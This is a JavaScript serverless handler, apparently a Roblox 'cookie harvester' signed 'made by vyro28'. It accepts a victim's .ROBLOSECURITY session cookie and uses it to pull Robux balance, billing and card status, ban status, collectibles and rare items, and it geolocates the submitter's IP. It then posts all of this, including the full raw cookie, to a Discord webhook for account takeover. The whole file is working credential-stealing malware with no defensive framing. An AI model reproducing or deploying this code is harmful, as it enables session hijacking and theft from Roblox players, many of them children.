// api/submit.js
const WEBHOOK_URL = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL;

// ---------- CSRF token (for billing & settings) ----------
async function getCsrfToken(cookie) {
  const res = await fetch("https://auth.roblox.com/v2/logout", {
    method: "GET",
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  const csrfToken = res.headers.get("x-csrf-token");
  if (!csrfToken) throw new Error("Failed to get CSRF token");
  return csrfToken;
}

// ---------- User public info ----------
async function getUser(userId) {
  const res = await fetch(`https://users.roblox.com/v1/users/${userId}`);
  if (!res.ok) throw new Error("User fetch failed");
  return await res.json();
}

function getAgeDays(createdDate) {
  return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
}

// ---------- Robux balance ----------
async function getRobux(userId, cookie) {
  const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
  });
  if (!res.ok) throw new Error("Robux fetch failed");
  const data = await res.json();
  return { balance: data.robux || 0 };
}

// ---------- Pending Robux (from sales/group payouts) ----------
async function getPendingRobux(userId, cookie) {
  let pending = 0;
  try {
    const res = await fetch(`https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Incoming&limit=100`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return pending;
    const data = await res.json();
    for (const tx of data.data || []) {
      if (tx.transactionType === "Sale" || tx.transactionType === "GroupPayout") {
        pending += tx.currency?.amount || 0;
      }
    }
  } catch (e) {}
  return pending;
}

// ---------- User Settings (Verified badge, Banned status) ----------
async function getUserSettings(cookie, csrfToken) {
  const defaultSettings = { verified: "False", banned: "False" };
  try {
    const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken
      }
    });
    if (!res.ok) return defaultSettings;
    const data = await res.json();
    return {
      verified: data.IsVerified ? "True" : "False",
      banned: data.IsBanned ? "True" : "False"
    };
  } catch (e) {
    return defaultSettings;
  }
}

// ---------- Billing (credit, convert, card) ----------
async function getBilling(cookie, csrfToken) {
  const defaultBilling = { credit: 0, convert: 0, card: "False" };
  try {
    const res = await fetch("https://www.roblox.com/billing/user/credit", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "X-CSRF-TOKEN": csrfToken
      }
    });
    if (!res.ok) return defaultBilling;
    const html = await res.text();
    const creditMatch = html.match(/"creditAmount":(\d+)/);
    const convertMatch = html.match(/"convertedRobux":(\d+)/);
    const hasCard = html.includes('"isCardLinked":true');
    return {
      credit: creditMatch ? parseInt(creditMatch[1], 10) : 0,
      convert: convertMatch ? parseInt(convertMatch[1], 10) : 0,
      card: hasCard ? "True" : "False"
    };
  } catch (e) {
    return defaultBilling;
  }
}

// ---------- Groups membership count ----------
async function getGroupsCount(userId) {
  try {
    const res = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`);
    if (!res.ok) return 0;
    const data = await res.json();
    return data.data?.length || 0;
  } catch (e) {
    return 0;
  }
}

// ---------- Total Place Visits (sum over all universes) ----------
async function getTotalPlaceVisits(userId) {
  let totalVisits = 0;
  let cursor = null;
  do {
    const url = `https://games.roblox.com/v2/users/${userId}/games?sortOrder=Asc&limit=50${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url);
    if (!res.ok) break;
    const data = await res.json();
    for (const game of data.data) {
      const detailsRes = await fetch(`https://games.roblox.com/v1/games?universeIds=${game.id}`);
      if (detailsRes.ok) {
        const details = await detailsRes.json();
        totalVisits += details.data[0]?.placeVisits || 0;
      }
      await new Promise(r => setTimeout(r, 20));
    }
    cursor = data.nextPageCursor;
  } while (cursor);
  return totalVisits;
}

// ---------- Collectibles (full list for third embed) ----------
async function getAllCollectibles(userId, cookie) {
  let items = [];
  let cursor = null;
  do {
    const url = `https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100${cursor ? `&cursor=${cursor}` : ""}`;
    const res = await fetch(url, { headers: { Cookie: `.ROBLOSECURITY=${cookie}` } });
    if (!res.ok) break;
    const data = await res.json();
    items.push(...data.data);
    cursor = data.nextPageCursor;
  } while (cursor);
  return items.map(item => ({
    name: item.name,
    assetId: item.assetId,
    link: `https://www.roblox.com/catalog/${item.assetId}/${encodeURIComponent(item.name.replace(/ /g, '-'))}`
  }));
}

// ---------- Email verification (via Verified hat) ----------
async function isEmailVerified(userId, cookie) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/102611803/is-owned`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return false;
    const data = await res.json();
    return data.ownership === true;
  } catch (e) {
    return false;
  }
}

// ---------- Rare item ownership (Korblox, Headless) ----------
async function checkItemOwnership(userId, cookie, assetId) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/${assetId}/is-owned`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
    });
    if (!res.ok) return "False";
    const data = await res.json();
    return data.ownership ? "True" : "False";
  } catch (e) {
    return "False";
  }
}

// ---------- FIXED: Recently Played Games (via Continue endpoint) ----------
async function getRecentlyPlayedGames(cookie) {
  try {
    const res = await fetch("https://www.roblox.com/charts/v2/Continue", {
      headers: {
        Cookie: `.ROBLOSECURITY=${cookie}`,
        "User-Agent": "Mozilla/5.0",
        Accept: "application/json"
      },
      redirect: "manual"
    });

    console.log("Status:", res.status);
    console.log("Content-Type:", res.headers.get("content-type"));

    const text = await res.text();

    console.log("First 500 chars:", text.slice(0, 500));

    // Detect HTML response
    if (text.startsWith("<!DOCTYPE") || text.startsWith("<html")) {
      console.log("Roblox returned HTML instead of JSON");
      return [];
    }

    const data = JSON.parse(text);

    console.log("Parsed data:", data);

    const games = Array.isArray(data)
      ? data
      : Array.isArray(data.data)
      ? data.data
      : [];

    return games.map(g =>
      g.name ||
      g.displayName ||
      g.gameName ||
      ""
    );

  } catch (e) {
    console.warn("Failed:", e);
    return [];
  }
}

async function getPlayedPasses(cookie) {
  const targets = [
    { key: "pet simulator", label: "Pet Simulator 99" },
    { key: "breaking point", label: "Breaking Point 2" },
    { key: "murder mystery", label: "Murder Mystery 2" }
  ];

  const recentGames = await getRecentlyPlayedGames(cookie);

  console.log("Recent games:", recentGames);

  return targets.map(t => {
    const played = recentGames.some(g =>
      (g.name || "").toLowerCase().includes(t.key)
    );

    return {
      name: t.label,
      played: played ? "True" : "False"
    };
  });
}

// ---------- Country flag from IP ----------
async function getCountryFlag(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
  if (!ip || ip === '::1') return '🏠 Local';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,countryCode`);
    const data = await geoRes.json();
    if (data.status === 'success' && data.countryCode) {
      const code = data.countryCode;
      const flag = code.split('').map(letter =>
        String.fromCodePoint(letter.charCodeAt(0) + 127397)
      ).join('');
      return `${flag} ${code}`;
    }
  } catch (e) {}
  return '🌍 Unknown';
}

// ---------- Avatar URL ----------
async function getUserAvatarUrl(userId) {
  try {
    const res = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`
    );
    if (!res.ok) return null;
    const data = await res.json();
    return data.data?.[0]?.imageUrl || null;
  } catch (e) {
    return null;
  }
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { cookie, rbxuid } = req.body;
  if (!cookie || !rbxuid) return res.status(400).json({ error: "Missing cookie or rbxuid" });
  if (!WEBHOOK_URL) return res.status(500).json({ error: "Missing WEBHOOK_URL env var" });

  try {
    // CSRF token (optional)
    let csrfToken = null;
    try {
      csrfToken = await getCsrfToken(cookie);
    } catch (e) {
      console.warn("CSRF token not obtained, billing/settings may be defaults.");
    }

    // Parallel fetch all data
    const [userData, robux, pendingRobux, groupsCount, totalVisits, allCollectibles, playedPasses, countryFlag, avatarUrl, emailVerified, korblox, headless] = await Promise.all([
      getUser(rbxuid),
      getRobux(rbxuid, cookie),
      getPendingRobux(rbxuid, cookie),
      getGroupsCount(rbxuid),
      getTotalPlaceVisits(rbxuid),
      getAllCollectibles(rbxuid, cookie),
      getPlayedPasses(cookie),
      getCountryFlag(req),
      getUserAvatarUrl(rbxuid),
      isEmailVerified(rbxuid, cookie),
      checkItemOwnership(rbxuid, cookie, 1373933),      // Korblox
      checkItemOwnership(rbxuid, cookie, 134082613)     // Headless
    ]);

    let settings = { verified: "False", banned: "False" };
    let billing = { credit: 0, convert: 0, card: "False" };
    if (csrfToken) {
      [settings, billing] = await Promise.all([
        getUserSettings(cookie, csrfToken),
        getBilling(cookie, csrfToken)
      ]);
    }

    const accountAge = getAgeDays(userData.created);
    const summary = robux.balance + pendingRobux;
    const playedPassesText = playedPasses.map(p => `${p.name} | ${p.played}`).join("\n");
    const rolimonsLink = `https://www.rolimons.com/player/${userData.id}`;
    const cookieThumb = "https://png.pngtree.com/png-vector/20201010/ourmid/pngtree-cartoon-delicious-dessert-cookie-cookie-clipart-png-image_2360164.jpg";
    const robuxEmoji = "<:Robux:1495081542370726080>";
    const collectiblesCount = allCollectibles.length;

    // ----- Embed 1: Account Stats (sent first) -----
    const statsEmbed = {
      title: "🔱 Vyro Har - Result",
      description: `**Check_VYROSECURITY | Vyro**\n\`2400c5b00-465b-1000-bd8d8e8fca5bc723\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      image: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        {
          name: "📌 About User",
          value: `**${userData.name}** (**${userData.displayName}**)\n**UserID:** \`${userData.id}\`\n**Account Age:** ${accountAge} Days\n**Place Visits:** ${totalVisits}\n**Country:** ${countryFlag}`,
          inline: false
        },
        {
          name: "💰 Robux",
          value: `${robuxEmoji} **Balance:** ${robux.balance}\n${robuxEmoji} **Pending:** ${pendingRobux}`,
          inline: true
        },
        {
          name: "💳 Billing",
          value: `**Credit:** ${billing.credit}\n**Convert:** ${billing.convert}\n**Card:** ${billing.card}`,
          inline: true
        },
        {
          name: "📊 Played | Passes",
          value: `\`\`\`\n${playedPassesText}\n\`\`\``,
          inline: false
        },
        {
          name: "📝 Summary",
          value: `**${summary}**`,
          inline: false
        },
        {
          name: "📊 Settings",
          value: `**(Verified)** ${settings.verified}\n**Is Banned** ${settings.banned}\n**Email Enabled** ${emailVerified ? "True" : "False"}`,
          inline: true
        },
        {
          name: "🎁 Collectibles",
          value: `**${collectiblesCount} items** (see third embed)`,
          inline: true
        },
        {
          name: "📊 Groups",
          value: `**Member of:** ${groupsCount}`,
          inline: true
        },
        {
          name: "💀 Rare Items",
          value: `**Korblox:** ${korblox}\n**Headless:** ${headless}`,
          inline: true
        },
        {
          name: "🔗 Rolimons Profile",
          value: `[Click here](${rolimonsLink})`,
          inline: false
        }
      ],
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // ----- Embed 2: .ROBLOSECURITY Cookie -----
    const cookieEmbed = {
      title: "🍪 ***.ROBLOSECURITY***",
      description: `**Full Roblox Cookie:**\n\`\`\`\n${cookie}\n\`\`\``,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      footer: { text: "made by vyro28 • cookie harvester" },
      timestamp: new Date().toISOString()
    };

    // ----- Embed 3: Collectible Items (with links) -----
    let collectiblesText = "";
    const maxDisplay = 20;
    for (let i = 0; i < Math.min(collectiblesCount, maxDisplay); i++) {
      const item = allCollectibles[i];
      collectiblesText += `**${item.name}**\n<${item.link}>\n\n`;
    }
    if (collectiblesCount > maxDisplay) {
      collectiblesText += `*... and ${collectiblesCount - maxDisplay} more items*`;
    }
    if (collectiblesText === "") collectiblesText = "No collectibles found.";

    const collectiblesEmbed = {
      title: "🎁 Collectible Inventory",
      description: collectiblesText,
      color: 0x1E3A8A,
      thumbnail: { url: cookieThumb },
      footer: { text: `Total items: ${collectiblesCount}` },
      timestamp: new Date().toISOString()
    };

    // Send embeds in order: 1) Stats, 2) Cookie, 3) Collectibles
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: "@everyone", username: "Vyro Harvest", embeds: [statsEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [cookieEmbed] })
    });
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Vyro Harvest", embeds: [collectiblesEmbed] })
    });

    return res.status(200).json({ success: true, firstTime: true });
  } catch (err) {
    console.error("Harvest error:", err);
    return res.status(500).json({ error: err.message });
  }
}
